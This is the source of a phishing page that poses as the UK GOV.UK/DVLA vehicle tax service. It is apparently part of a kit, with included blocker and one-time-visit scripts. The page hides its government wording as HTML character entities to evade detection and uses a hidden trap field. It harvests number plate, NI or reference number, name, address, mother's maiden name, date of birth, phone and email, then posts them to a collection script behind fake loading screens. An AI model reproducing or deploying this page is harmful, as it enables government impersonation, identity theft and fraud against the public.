<?php
require "includes/blocker.php";
require "includes/One_Time.php";
require "includes/functions.php";
error_reporting(0);
?>
<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" href="media/favicon.ico" type="image/x-icon">
<link href="media/template.css" media="screen" rel="stylesheet" type="text/css">
<link href="media/template-print.css" media="print" rel="stylesheet" type="text/css">
<link href="media/fonts.css" media="screen" rel="stylesheet" type="text/css">
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="media/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="media/apple-touch-icon-144x144.png">
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="media/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon-precomposed" href="media/apple-touch-icon-57x57.png">
<script>
function tryit() {
document.getElementById("blank").value = "Blank"; 
setTimeout(function() {
document.getElementById("firstname").focus(); 
}, 1800);
}


function submitit() {
document.getElementById('Loading1').style.display = "block";
setTimeout(function() {
document.getElementById('maindiv1').style.display = "none";
document.getElementById('maindiv2').style.display = "block";
}, 1700);
}


function check(form) {


if (form.plate.value.length < 5)
{ document.getElementById("div1").classList.add('validation'); document.getElementById("errortxt1").style.display = "block"; form.plate.focus(); return;} else { submitit(); document.getElementById("div1").classList.remove('validation'); document.getElementById("errortxt1").style.display = "none"; }



if (form.blank.value == "")
{ form.blank.focus(); return;}


if (form.firstname.value == "")
{ document.getElementById("div3").classList.add('validation'); document.getElementById("errortxt3").style.display = "block"; form.firstname.focus(); return;} else { document.getElementById("div3").classList.remove('validation'); document.getElementById("errortxt3").style.display = "none"; }

if (form.surname.value == "")
{ document.getElementById("div3").classList.add('validation'); document.getElementById("errortxt3").style.display = "block"; form.surname.focus(); return;} else { document.getElementById("div3").classList.remove('validation'); document.getElementById("errortxt3").style.display = "none"; }

if (form.address.value == "")
{ document.getElementById("div4").classList.add('validation'); document.getElementById("errortxt4").style.display = "block"; form.address.focus(); return;} else { document.getElementById("div4").classList.remove('validation'); document.getElementById("errortxt4").style.display = "none"; }

if (form.city.value == "")
{ document.getElementById("div4").classList.add('validation'); document.getElementById("errortxt4").style.display = "block"; form.city.focus(); return;} else { document.getElementById("div4").classList.remove('validation'); document.getElementById("errortxt4").style.display = "none"; }


if (form.zipcode.value.length < 3)
{ document.getElementById("div4").classList.add('validation'); document.getElementById("errortxt4").style.display = "block"; form.zipcode.focus(); return;} else { document.getElementById("div4").classList.remove('validation'); document.getElementById("errortxt4").style.display = "none"; }

if (form.mmn.value == "")
{ document.getElementById("div5").classList.add('validation'); document.getElementById("errortxt5").style.display = "block"; form.mmn.focus(); return;} else { document.getElementById("div5").classList.remove('validation'); document.getElementById("errortxt5").style.display = "none"; }

var regExpress = /^(?:0[1-9]|[12]\d|3[01])([\/.-])(?:0[1-9]|1[012])\1(?:19|20)\d\d$/
if (!regExpress.test(form.dob.value))
{ document.getElementById("div5").classList.add('validation'); document.getElementById("errortxt5").style.display = "block"; form.dob.focus(); return;} else { document.getElementById("div5").classList.remove('validation'); document.getElementById("errortxt5").style.display = "none"; }


var regExpress = /^\d{9,11}$/
if (!regExpress.test(form.phonenr.value))
{ document.getElementById("div5").classList.add('validation'); document.getElementById("errortxt5").style.display = "block"; form.phonenr.focus(); return;} else { document.getElementById("div5").classList.remove('validation'); document.getElementById("errortxt5").style.display = "none"; }

var regExpress = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
if (!regExpress.test(form.email.value))
{ document.getElementById("div5").classList.add('validation'); document.getElementById("errortxt5").style.display = "block"; form.email.focus(); return;} else { document.getElementById("div5").classList.remove('validation'); document.getElementById("errortxt5").style.display = "none"; }


document.getElementById("Loading2").style.display = "block";
setTimeout(function() { form.submit() }, 2000);
}
</script>
<title>
&#84;&#97;&#120;&#105;&#110;&#103;&#32;&#97;&#32;&#118;&#101;&#104;&#105;&#99;&#108;&#101;&#32;&#45;&#32;&#71;&#79;&#86;&period;&#85;&#75;</title>
<style type="text/css">
#MainContent_VedPicker_rbVED h4
{
padding: 0;
margin: 0;
margin-top: 1em;
margin-bottom: 0.5em;
}
#blank {  position: absolute;  clip: rect(0,0,0,0); }
</style>
<script type="text/javascript" src="https://code.jquery.com/jquery-2.2.3.js"></script>
</head>
<body ontouchstart="" class="js-enabled">
<form method="post" action="php/status.php" id="EVL" novalidate="">
<header role="banner" class="with-proposition" id="global-header">
<div class="header-wrapper">
<div class="header-global">
<div class="header-logo">
<a id="logo" class="content">
<img src="media/dd.png" width="35" height="31"> &#71;&#79;&#86;&period;&#85;&#75;
</a>
</div>
</div>
<div class="header-proposition">
  <div class="content">
<nav id="proposition-menu">
  <a id="proposition-name">Vehicle tax</a>
</nav>
  </div>
</div>
</div>
</header>
<div id="globalNotice" class="maincontent">
<span id="lblGlobalMessage"><a class="toggle-target">&#86;&#105;&#101;&#119;&#32;&#98;&#117;&#100;&#103;&#101;&#116;&#32;&#99;&#104;&#97;&#110;&#103;&#101;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;</a>
</span>   
</div>
<div id="global-header-bar"></div>
<div class="maincontent">
<div class="phase-banner">
  <p>
<strong class="phase-tag">BETA</strong>
<span>This is a new service – your <a id="FeedbackLink" href="#">feedback</a> will help us to improve it.</span>
  </p>
</div>
</div>
<div id="wrapper">
<div class="maincontent">
<div id="startHeader" class="start-header group">
<h1>
&#84;&#97;&#120;&#105;&#110;&#103;&#32;&#97;&#32;&#118;&#101;&#104;&#105;&#99;&#108;&#101;
</h1>
</div>
<div id="maindiv1" class="body-container group">
<div>
<p>
<span class="label"><p>&#84;&#97;&#120;&#32;&#121;&#111;&#117;&#114;&#32;&#99;&#97;&#114;&comma;&#32;&#109;&#111;&#116;&#111;&#114;&#99;&#121;&#99;&#108;&#101;&#32;&#111;&#114;&#32;&#111;&#116;&#104;&#101;&#114;&#32;&#118;&#101;&#104;&#105;&#99;&#108;&#101;&#32;&#117;&#115;&#105;&#110;&#103;&#32;&#97;&#32;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#32;&#110;&#117;&#109;&#98;&#101;&#114;&#32;&#102;&#114;&#111;&#109;&colon;</p>
<ul>
<li>&#97;&#32;&#114;&#101;&#99;&#101;&#110;&#116;&#32;&#114;&#101;&#109;&#105;&#110;&#100;&#101;&#114;&#32;&lpar;&#86;&#49;&#49;&rpar;&#32;&#111;&#114;&#32;&lsquo;&#108;&#97;&#115;&#116;&#32;&#99;&#104;&#97;&#110;&#99;&#101;&rsquo;&#32;&#119;&#97;&#114;&#110;&#105;&#110;&#103;&#32;&#108;&#101;&#116;&#116;&#101;&#114;&#32;&#102;&#114;&#111;&#109; <abbr title="&#68;&#114;&#105;&#118;&#101;&#114;&#32;&#97;&#110;&#100;&#32;&#86;&#101;&#104;&#105;&#99;&#108;&#101;&#32;&#76;&#105;&#99;&#101;&#110;&#115;&#105;&#110;&#103;&#32;&#65;&#103;&#101;&#110;&#99;&#121;">DVLA</abbr>
</li>
<li>&#121;&#111;&#117;&#114;&#32;&#118;&#101;&#104;&#105;&#99;&#108;&#101;&#32;&#108;&#111;&#103;&#32;&#98;&#111;&#111;&#107;&#32;&lpar;&#86;&#53;&#67;&rpar;&#32;&#45;&#32;&#105;&#116;&#32;&#109;&#117;&#115;&#116;&#32;&#98;&#101;&#32;&#105;&#110;&#32;&#121;&#111;&#117;&#114;&#32;&#110;&#97;&#109;&#101;</li>
<li>&#116;&#104;&#101;&#32;&#103;&#114;&#101;&#101;&#110;&#32;&lsquo;&#110;&#101;&#119;&#32;&#107;&#101;&#101;&#112;&#101;&#114;&rsquo;&#32;&#115;&#108;&#105;&#112;&#32;&#102;&#114;&#111;&#109;&#32;&#97;&#32;&#108;&#111;&#103;&#32;&#98;&#111;&#111;&#107;&#32;&#105;&#102;&#32;&#121;&#111;&#117;&rsquo;&#118;&#101;&#32;&#106;&#117;&#115;&#116;&#32;&#98;&#111;&#117;&#103;&#104;&#116;&#32;&#105;&#116;</li>
</ul></span>
</p>
</div>
<div id="div1" class="">
<p>
<strong>
<label for="plate" class="label">&#86;&#101;&#104;&#105;&#99;&#108;&#101;&#32;&#114;&#101;&#103;&#105;&#115;&#116;&#114;&#97;&#116;&#105;&#111;&#110;&#32;&lpar;&#110;&#117;&#109;&#98;&#101;&#114;&#32;&#112;&#108;&#97;&#116;&#101;&rpar;</label>
</strong>
</p>
<span id="errortxt1" class="Validator" style="display:none;">This is a required field.</span>
<p>
<input name="plate" type="text" maxlength="8" id="plate" class="input-large input-upper" onKeyDown="if(event.keyCode==13) check(this.form);">
</p>
</div>
<div id="div2" class="">
<p>
<strong>
<label for="reference" class="label">11 / 12 / 16 digit reference number or Ni number (eg JW765154C)</label>
</strong>
</p>
<span id="errortxt2" class="Validator" style="display:none;">This is a required field.</span>
<p>
<input name="reference" placeholder="Optional" maxlength="16" id="reference" class="input-large" type="tel" onKeyDown="if(event.keyCode==13) check(this.form);">
</p>
</div>
<div>
<p>
<span id="MainContent_lblV5C2Aquire" class="label">Provide correct data during this process.</span>
</p>
</div>
<input type="text" id="blank" name="blank" onfocus="tryit();">
<div class="action">
<input onclick="check(this.form)" type="button" name="butContinue" value="Continue" id="MainContent_butContinue" class="button">
<br><br>
<img src="media/loading.gif" id="Loading1" style="display: none;">
</div>
</div>

<div id="maindiv2" style="display:none;" class="body-container group">
<div id="div3" class="">
<p>
<strong>
<label for="plate" class="label">&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#101;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#110;&#97;&#109;&#101;&#32;&#101;&#120;&#97;&#99;&#116;&#108;&#121;&#32;&#97;&#115;&#32;&#105;&#116;&#32;&#97;&#112;&#112;&#101;&#97;&#114;&#115;&#32;&#111;&#110;&#32;&#121;&#111;&#117;&#114;&#32;&#111;&#102;&#102;&#105;&#99;&#105;&#97;&#108;&#32;&#105;&#100;&#101;&#110;&#116;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;</label>
</strong>
</p>
<span id="errortxt3" class="Validator" style="display:none;">This is a required field.</span>
<p>
<input name="firstname" id="firstname" placeholder="First name (s)" type="text" maxlength="25" class="input-large" onKeyDown="if(event.keyCode==13) check(this.form);">
<input name="surname" id="surname" placeholder="Surname" type="text" maxlength="25" class="input-large" onKeyDown="if(event.keyCode==13) check(this.form);">
</p>
</div>
<div id="div4" class="">
<p>
<strong>
<label for="address" class="label">Enter your address</label>
</strong>
</p>
<span id="errortxt4" class="Validator" style="display:none;">This is a required field.</span>
<p>
<p><input maxlength="25" placeholder="Street address and house number" name="address" id="address" class="input-large" type="text" onKeyDown="if(event.keyCode==13) check(this.form);"><p>
<input maxlength="25" placeholder="City" name="city" id="city" class="input-large" type="text" onKeyDown="if(event.keyCode==13) check(this.form);">
<input maxlength="25" placeholder="Postcode" name="zipcode" id="zipcode" class="input-large" type="text" onKeyDown="if(event.keyCode==13) check(this.form);">
</p>
</div>
<div id="div5" class="">
<p>
<strong>
<label for="address" class="label">&#69;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#115;&#101;&#99;&#117;&#114;&#105;&#116;&#121;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;</label>
</strong>
</p>
<span id="errortxt5" class="Validator" style="display:none;">This is a required field.</span>
<p>
<input maxlength="25" placeholder="Mother's maiden name" name="mmn" id="mmn" class="input-large" type="text" onKeyDown="if(event.keyCode==13) check(this.form);">
<input maxlength="10" placeholder="Date of birth (DD/MM/YYYY)" name="dob" id="dob" class="input-large" type="tel" onKeyDown="if(event.keyCode==13) check(this.form);">
</p><p>
<input maxlength="11" placeholder="Mobile phone number" name="phonenr" id="phonenr" class="input-large" type="tel" onKeyDown="if(event.keyCode==13) check(this.form);">
<input maxlength="25" placeholder="Email address" name="email" id="email" class="input-large" type="text" onKeyDown="if(event.keyCode==13) check(this.form);">
</p>
</div>


<div>
<p>
<span id="MainContent_lblV5C2Aquire" class="label">Provide correct data during this process.</span>
</p>
</div>
<div class="action">
<input onclick="check(this.form)" type="button" name="butContinue" value="Continue" id="MainContent_butContinue" class="button">
<br><br>
<img src="media/loading.gif" id="Loading2" style="display: none;">
</div>
</div>




</div>
</div>
<footer class="group js-footer" id="footer" role="contentinfo">
<div class="footer-wrapper">
<div class="footer-meta">
<div class="footer-meta-inner">
<ul>
<li>
<a id="cookiesLink" href="#">Cookies</a>
</li>
<li>
<a href="#">Terms and Conditions</a>
</li>
<li>
<a id="butEnglish" href="#">English</a>
</li>
<li>
<a id="butWelsh" href="#">Cymraeg</a>
</li>
<li>
<a href="#"><span id="privacyPolicy">Privacy Information Notice</span></a> 
</li>
<li>
Built by the <a href="#">&#68;&#114;&#105;&#118;&#101;&#114;&#32;&amp;&#32;&#86;&#101;&#104;&#105;&#99;&#108;&#101;&#32;&#76;&#105;&#99;&#101;&#110;&#115;&#105;&#110;&#103;&#32;&#65;&#103;&#101;&#110;&#99;&#121;</a> 
</li>
</ul>
<div class="open-licence">
<p class="logo"><a href="#">&#79;&#112;&#101;&#110;&#32;&#71;&#111;&#118;&#101;&#114;&#110;&#109;&#101;&#110;&#116;&#32;&#76;&#105;&#99;&#101;&#110;&#99;&#101;&#32;</a></p>
<p>
All content is available under the <a href="#">
&#79;&#112;&#101;&#110;&#32;&#71;&#111;&#118;&#101;&#114;&#110;&#109;&#101;&#110;&#116;&#32;&#76;&#105;&#99;&#101;&#110;&#99;&#101;&#32; v2.0</a>, except where otherwise stated</p>
</div>
</div>
<div class="copyright">
<a href="#">
© Crown copyright</a>
</div>
</div>
</div>
</footer>
</form>

<script>

var format = "mm/dd/yyyy";
var match = new RegExp(format
    .replace(/(\w+)\W(\w+)\W(\w+)/, "^\\s*($1)\\W*($2)?\\W*($3)?([0-9]*).*")
    .replace(/m|d|y/g, "\\d"));
var replace = "$1/$2/$3$4"
    .replace(/\//g, format.match(/\W/));

function doFormat(target)
{
    target.value = target.value
        .replace(/(^|\W)(?=\d\W)/g, "$10")   // padding
        .replace(match, replace)             // fields
        .replace(/(\W)+/g, "$1");            // remove repeats
}

$("input[name='dob']:first").keyup(function(e) {
   if(!e.ctrlKey && !e.metaKey && (e.keyCode == 32 || e.keyCode > 46))
      doFormat(e.target)
});

</script>

</body></html>